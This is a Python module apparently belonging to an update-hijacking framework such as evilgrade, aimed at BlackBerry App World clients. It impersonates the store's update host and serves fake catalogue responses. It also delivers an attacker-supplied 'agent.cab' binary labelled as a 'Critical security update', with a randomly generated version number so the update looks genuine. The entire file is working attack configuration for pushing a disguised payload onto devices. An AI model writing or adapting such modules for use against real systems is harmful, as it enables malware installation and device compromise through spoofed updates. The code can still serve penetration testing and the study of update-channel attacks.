from modules import ModuleBase


class bbappworld(ModuleBase):
    name = 'bbappworld'
    version = '1.0'
    appver = '< 1.1.0.33'
    author = ['Francisco Amato < famato +[AT]+ infobytesec.com>']
    description = ''
    agent_filename = './agent/agent.cab'
    enabled = False
    vh = 'appworld.blackberry.com' 
    #http://drbolsen.wordpress.com/2008/07/14/coddec-released/
    #http://www.dontstuffbeansupyournose.com/?p=99
    requests = [
        {   'path': '/ClientAPI/content/', #10.0
            'type': 'file',
            'method': '',
            'bin': 0,
            'string' : "",
            'parse': 0,
            'file': './include/bbappworld/click_aplicacion',
        },
        {   'path': '/ClientAPI/featured', #10.0
            'type': 'file',
            'method': '',
            'bin': 0,
            'string' : "",
            'parse': 0,
            'file': './include/bbappworld/featured',
        },
        {   'path': '/ClientAPI/image/', #10.0
            'type': 'file',
            'method': '',
            'bin': 0,
            'string' : "",
            'parse': 0,
            'file': './include/bbappworld/images',
        },
        {   'path': '.yim',
            'type': 'agent',
            'method': '',
            'bin': 1,
            'string': '',
            'parse': 0,
            'file': ''
        }
    ]
    options = {
        'description': {
            'val': 'Critical security update',
            'desc': 'Description display in the update'
        },
        'version': {
            'val': "'30.' + rand_num(1) + '.' + rand_num(4) + '.' + rand_num(1)",
            'hidden': 1,
            'dynamic': 1,
        },
        'rnd1': {
            'val': 'rand_num(5)',
            'hidden': 1,
            'dynamic': 1,
        }
    }
